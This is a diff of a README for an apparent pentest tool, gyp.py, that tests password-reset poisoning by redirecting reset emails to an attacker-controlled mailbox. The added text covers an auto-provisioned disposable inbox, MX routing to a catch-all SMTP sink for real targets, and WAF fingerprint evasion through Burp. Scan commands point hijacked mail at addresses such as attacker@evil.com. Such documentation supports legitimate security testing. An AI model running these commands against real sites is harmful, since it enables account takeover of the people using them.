@@ -46,23 +46,24 @@ Follow these steps to install **HExHTTP**:
 ## Usage
 
 ```bash
-usage: gyp.py [-h] [-u URL] [-r RAWREQUEST] [-i INTERACT] [-e EMAIL] [-H CUSTOM_HEADER] [-A USER_AGENT]
-              [-hu HUMANS] [-p [PROXY]] [--burp [BURP]]
+usage: gyp.py [-h] [-u URL] -r RAWREQUEST [-i INTERACT] [-e EMAIL] [--mail-wait MAIL_WAIT] [--disposable-mail] [--reset-url RESET_URL] [-H CUSTOM_HEADER] [-A USER_AGENT] [-hu HUMANS] [-p [PROXY]] [--burp [BURP]]
 
 options:
   -h, --help            show this help message and exit
 
 > General:
-  -u URL, --url URL     URL to test [required] if no -f/--file provided
+  -u URL, --url URL     Optional. Host/path come from -r (the raw request); this only sets the scheme (default https). Pass e.g. -u http://host to force plain HTTP.
   -r RAWREQUEST, --rawrequest RAWREQUEST
-                        Raw request file path
+                        Raw request file path [required]
   -i INTERACT, --interact INTERACT
                         controlled url or interact
   -e EMAIL, --email EMAIL
-                        Attacker-controlled email to hijack the reset to
-                        (catch-all: invent any localpart on your sink domain)
+                        Attacker-controlled email to hijack the reset to (catch-all: invent any localpart on your sink domain)
   --mail-wait MAIL_WAIT
-                        Seconds to poll the SMTP sink for the hijacked reset email (default: 30)
+                        Seconds to wait/poll the mailbox for the hijacked reset email (default: 30)
+  --disposable-mail     Auto-provision a throwaway inbox (mail.tm) and use it as -e (no domain/VPS needed)
+  --reset-url RESET_URL
+                        Reset link OR token pasted from the received email - deep-analyzes the token offline (JWT weak-secret/alg, enumerable id, entropy, time-based)
 
 > Request Settings:
   -H CUSTOM_HEADER, --header CUSTOM_HEADER
@@ -74,9 +75,9 @@ options:
 
 > Proxy Settings:
   -p [PROXY], --proxy [PROXY]
-                        Proxy all requests through this proxy (format: host:port, default: 127.0.0.1:8080)
-  --burp [BURP]         Send behavior and confirmed requests to Burp proxy (format: host:port, default:
-                        127.0.0.1:8080)
+                        Proxy all requests (host:port; bare -p defaults to http://127.0.0.1:8080). Useful to bypass WAF client-fingerprinting: the upstream request is then re-issued by Burp, whose TLS/HTTP fingerprint the site already
+                        accepts.
+  --burp [BURP]         Send behavior and confirmed requests to Burp proxy (host:port, default http://127.0.0.1:8080)
 
 ```
 
@@ -100,7 +101,7 @@ I use "cloudflared" on my exemples:
 ## OOB email capture (confirming the takeover)
 
 Most reset-poisoning bugs are **blind**: the proof is that the *attacker* receives the
-reset email. `mini_interact.py` runs a **catch-all SMTP sink** — it accepts **any**
+reset email. `mini_interact.py` runs a **catch-all SMTP sink** - it accepts **any**
 recipient address, so there is **no mailbox to create**. You just invent the `-e`
 address; only the domain part matters (it must route to the sink).
 
@@ -110,20 +111,20 @@ and flags CC/BCC / multi-recipient injection when victim **and** attacker are bo
 the envelope.
 
 **What to put in `-e`:**
-- **Local lab** — the domain is irrelevant (point the target app's SMTP at the sink).
+- **Local lab** - the domain is irrelevant (point the target app's SMTP at the sink).
   Use any address different from the victim: `-e attacker@evil.com`.
-- **Real target** — set your domain's `MX` to the host running the sink
+- **Real target** - set your domain's `MX` to the host running the sink
   (`--smtp-port 25`, as root), then `-e anything@your-domain`.
 
 ### No domain / no VPS? Use a disposable inbox
 
 `--disposable-mail` provisions a throwaway mailbox on a real, internet-reachable
-service (mail.tm), uses it as `-e` automatically, and polls it for the reset email —
+service (mail.tm), uses it as `-e` automatically, and polls it for the reset email -
 **no SMTP sink, no domain, no MX**. Works from a laptop against a real target
 (cloudflared not even required). Caveat: disposable domains are sometimes blocklisted.
 
 ```bash
-# nothing to host — gyp creates the inbox, uses it as -e, analyzes the token
+# nothing to host - gyp creates the inbox, uses it as -e, analyzes the token
 python3 gyp.py -u "https://target/reset" -r req.txt --disposable-mail --mail-wait 60
 ```
 
@@ -137,11 +138,11 @@ gyp prints the address **and** browser credentials so you can read the mail by h
 Open https://mail.tm/, log in with that address + password, and read the reset mail.
 
 ```bash
-# terminal 1 — sink (HTTP dashboard on :8000, SMTP catch-all on :1025)
+# terminal 1 - sink (HTTP dashboard on :8000, SMTP catch-all on :1025)
 python3 mini_interact.py --smtp-port 1025          # use --smtp-port 25 on a real VPS
-# terminal 2 — expose the dashboard so gyp can read /api/mail
+# terminal 2 - expose the dashboard so gyp can read /api/mail
 ./cloudflared tunnel --url http://localhost:8000
-# terminal 3 — scan; -e is where the hijacked mail should land
+# terminal 3 - scan; -e is where the hijacked mail should land
 python3 gyp.py -u "https://target/reset" -r req.txt \
    -i https://xxxx.trycloudflare.com -e pentest@your-domain --mail-wait 60
 ```
@@ -156,7 +157,7 @@ Requires `aiosmtpd` (in `requirements.txt`). Verify routing anytime with
 - Absolute uri injection
 - Email Hijicking
 - Token Analyse
-- OOB email capture (catch-all SMTP sink) — confirms takeover & extracts the reset token
+- OOB email capture (catch-all SMTP sink) - confirms takeover & extracts the reset token
 
 
 ### Based on
